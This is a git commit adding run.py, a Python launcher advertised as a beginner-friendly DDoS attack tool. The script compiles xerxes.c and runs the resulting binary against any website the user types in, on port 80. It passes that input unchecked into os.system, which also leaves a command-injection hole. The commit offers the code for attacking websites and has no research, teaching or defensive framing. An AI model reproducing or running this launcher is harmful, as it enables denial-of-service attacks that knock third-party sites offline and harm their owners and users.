67d84859ed54f21265b57cdb03a6a25241c80a42
Gaurav Gupta <37450514+Gaurav14376@users.noreply.github.com>
2019-03-06 23:21:04 +0530

    Add files via upload
    This is a simple DDoS Attack tool and even a begginer hacker can use this. Just type python run.py

---
+++ run.py
@@ -0,0 +1,14 @@
+import os
+os.system("apt install toilet")
+os.system("clear")
+print("""\033[5;34;40m\n
+ ____  ____                 _   _   _             _
+|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
+| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
+| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <
+|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
+""")   
+os.system("gcc xerxes.c -o xerxes")
+os.system("chmod +x xerxes.c")
+a = input("\033[5;32;40m\n Enter website address eg : www.fakesite.com \n")
+os.system("./xerxes "+a+" 80")
